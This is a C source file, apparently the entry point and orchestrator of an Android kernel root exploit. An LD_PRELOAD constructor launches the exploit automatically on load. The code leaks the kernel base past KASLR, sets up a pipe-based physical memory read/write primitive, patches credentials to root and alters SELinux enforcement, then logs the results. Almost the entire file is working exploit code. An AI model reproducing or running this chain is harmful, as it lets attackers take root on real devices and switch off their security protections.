#include "unplus.h"

/* --- CyberMeowfia-specific state --- */
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
int memfd_leak;

/* --- preload entry --- */
#ifdef UNPLUS_PRELOAD
__attribute__((constructor)) static void unplus_preload_init(void) {
  /* Guard against recursive preload: spawn_root_child forks children
   * that inherit LD_PRELOAD. Clear it before any fork happens. */
  static int started;
  if (started) return;
  started = 1;
  unsetenv("LD_PRELOAD");

  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();

  /* full exploit chain — must run FIRST to get root (pipe physrw
   * cred patch). KSU (loaded in root.c) provides su afterwards. */
  run_exploit(0, NULL);
}
#endif

/* --- binary entry --- */
#ifndef UNPLUS_PRELOAD
int main(int argc, char **argv) {
  setvbuf(stdout, NULL, _IONBF, 0);

  if (argc > 1 && strcmp(argv[1], "--step=1") == 0) {
    /* Standard Unix exit convention: 0 = success. run_write1_selinux
     * returns 1 on success / 0 on failure, so invert it. */
    return run_write1_selinux(8) ? 0 : 1;
  }

  /* full auto mode */
  return run_exploit(argc, argv);
}
#endif

/* --- common: exploit orchestrator --- */
int run_exploit(int argc, char **argv) {
  (void)argc;
  (void)argv;

  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  log_startup_context();
  init_ashmem_path();

  pin_to_core(CORE);
  if (!slide_leak_kernel_base()) {
    pr_error("slide kaslr leak failed\n");
    return 1;
  }

  pin_to_core(CORE);
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);

  run_main_route_threads();

  pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016zx slide=%016zx\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done,
             kaslr_done, kaslr_base, kaslr_slide);
  pr_success("pipe physrw pid=%d done=%d root=%d kaslr=%d read_ok=%d "
             "write_ok=%d rw64=%d/%d uid=%u->%u sid=%u/%u->%u/%u "
             "selinux=%u->%u setgid=%d setuid=%d setenforce=%d/%d\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done, kaslr_done,
             physrw_read_ok, physrw_write_ok, physrw_read64_ok, physrw_write64_ok,
             root_uid_before, root_uid_after, cred_sid_before, real_cred_sid_before,
             cred_sid_after, real_cred_sid_after, selinux_before, selinux_after,
             setgid_ret, setuid_ret, setenforce_ret, setenforce_errno);
  if (pipe_prepare_child > 0) {
    kill(pipe_prepare_child, SIGKILL); /* best-effort, may fail under enforcing */
    waitpid(pipe_prepare_child, NULL, WNOHANG); /* don't block */
  }
  return 0;
}
